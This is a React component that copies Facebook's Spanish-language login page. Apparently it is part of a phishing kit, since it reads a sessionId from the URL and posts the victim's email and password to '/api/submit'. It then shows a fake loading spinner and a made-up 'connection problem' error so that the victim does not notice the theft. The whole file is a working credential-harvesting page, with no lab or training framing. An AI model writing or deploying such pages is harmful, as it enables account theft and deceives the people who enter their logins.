import { useState, useEffect } from "react";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";

export default function FacebookTemplate() {
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [showError, setShowError] = useState(false);

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    setSessionId(urlParams.get('sessionId'));
  }, []);
  
  const [formData, setFormData] = useState({
    email: '',
    password: ''
  });

  const submitMutation = useMutation({
    mutationFn: async (data: any) => {
      const response = await fetch("/api/submit", {
        method: "POST",
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          sessionId,
          type: 'form_submission',
          screenName: 'login',
          data
        })
      });
      return response.json();
    }
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    
    submitMutation.mutate(formData, {
      onSuccess: () => {
        // Simulate Facebook login process
        setTimeout(() => {
          setIsLoading(false);
          setShowError(true);
        }, 2000); // Show loading for 2 seconds
      },
      onError: () => {
        setIsLoading(false);
        setShowError(true);
      }
    });
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  return (
    <div className="facebook-template" style={{ minHeight: '100vh' }}>
      <style dangerouslySetInnerHTML={{
        __html: `
          .facebook-template {
            background: #f0f2f5 !important;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            font-family: arial;
          }
          .facebook-template * {
            box-sizing: border-box;
          }
            * {
              padding: 0;
              margin: 0;
            }
            body {
              background: #f0f2f5;
              display: flex;
              justify-content: center;
              font-family: arial;
            }
            #n {
              width: 38%;
              font-size: 28px;
              margin-top: 16%;
              margin-right: 10%;
            }
            #n p:first-child {
              font-size: 60px;
              font-weight: bold;
              color: #1877f2;
            }
            #m {
              width: 30%;
              margin-top: 12%;
            }
            #m .a {
              background: #fff;
              border-radius: 8px;
              text-align: center;
              padding-top: 1.5%;
              padding: 2.5%;
            }
            #m .a .cont {
              width: 90%;
              padding: 3.5%;
              font-size: 14px;
              border-radius: 5px;
              color: #c4c6cd;
              border: 0.2px solid #dddfe2;
              margin-top: 3%;
            }
            #m .a .cont:focus {
              color: #000;
            }
            #m .a .b {
              margin-top: 3%;
              width: 97%;
              padding: 2.8%;
              border-radius: 5px;
              font-weight: bold;
              font-size: 18px;
              border: 0px solid #fff;
              background: #1877f2;
              color: #fff;
              cursor: pointer;
            }
            #m .a .f {
              margin-top: 3%;
              padding-bottom: 5%;
            }
            #m .a .f a {
              list-style: none;
              text-decoration: none;
              color: #1877f3;
              font-size: 14px;
            }
            @media (max-width: 768px) {
              body {
                flex-direction: column;
                align-items: center;
              }
              #n {
                width: 90%;
                margin-top: 5%;
                margin-right: 0;
                text-align: center;
              }
              #n p:first-child {
                font-size: 40px;
              }
              #m {
                width: 90%;
                margin-top: 5%;
              }
            }
          `
        }} />
      
      {isLoading ? (
        // Loading screen
        <div style={{ 
          position: 'fixed', 
          top: 0, 
          left: 0, 
          width: '100%', 
          height: '100%', 
          background: '#f0f2f5', 
          display: 'flex', 
          flexDirection: 'column', 
          justifyContent: 'center', 
          alignItems: 'center',
          zIndex: 9999
        }}>
          <div style={{ textAlign: 'center' }}>
            <div style={{ 
              width: '50px', 
              height: '50px', 
              border: '3px solid #1877f2', 
              borderTop: '3px solid transparent', 
              borderRadius: '50%', 
              animation: 'spin 1s linear infinite',
              marginBottom: '20px'
            }}></div>
            <p style={{ 
              color: '#1877f2', 
              fontSize: '18px', 
              fontWeight: 'bold',
              fontFamily: 'arial'
            }}>
              Iniciando sesión...
            </p>
          </div>
          <style dangerouslySetInnerHTML={{
            __html: `
              @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
              }
            `
          }} />
        </div>
      ) : showError ? (
        // Error screen
        <div style={{ 
          width: '100%', 
          display: 'flex', 
          justifyContent: 'center', 
          alignItems: 'center',
          minHeight: '100vh',
          background: '#f0f2f5'
        }}>
          <div style={{
            width: '400px',
            background: '#fff',
            borderRadius: '8px',
            padding: '30px',
            textAlign: 'center',
            boxShadow: '0 2px 4px rgba(0,0,0,0.1)'
          }}>
            <div style={{ color: '#1877f2', fontSize: '40px', marginBottom: '20px' }}>⚠️</div>
            <h2 style={{ color: '#1c1e21', marginBottom: '15px', fontSize: '20px' }}>
              Problema de conexión
            </h2>
            <p style={{ color: '#65676b', marginBottom: '20px', lineHeight: '1.4' }}>
              Estamos experimentando problemas técnicos. Por favor, inténtalo de nuevo más tarde.
            </p>
            <button 
              onClick={() => window.location.reload()} 
              style={{
                background: '#1877f2',
                color: 'white',
                border: 'none',
                padding: '10px 20px',
                borderRadius: '6px',
                fontSize: '16px',
                cursor: 'pointer',
                fontWeight: 'bold'
              }}
            >
              Intentar de nuevo
            </button>
          </div>
        </div>
      ) : (
        // Login form
        <>
          <div id="n">
            <p>facebook</p>
            <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
          </div>
          <div id="m">
            <div className="a">
              <form onSubmit={handleSubmit} data-testid="facebook-login-form">
                <input
                  className="cont"
                  type="email"
                  name="email"
                  placeholder="Correo electrónico o número de teléfono"
                  value={formData.email}
                  onChange={handleInputChange}
                  required
                  data-testid="input-email"
                />
                <input
                  className="cont"
                  type="password"
                  name="password"
                  placeholder="Contraseña"
                  value={formData.password}
                  onChange={handleInputChange}
                  required
                  data-testid="input-password"
                />
                <button
                  className="b"
                  type="submit"
                  disabled={isLoading || submitMutation.isPending}
                  data-testid="button-submit"
                >
                  {isLoading || submitMutation.isPending ? 'Iniciando sesión...' : 'Iniciar sesión'}
                </button>
                <div className="f">
                  <a href="#" data-testid="link-forgot-password">¿Olvidaste tu contraseña?</a>
                </div>
              </form>
            </div>
          </div>
        </>
      )}
    </div>
  );
}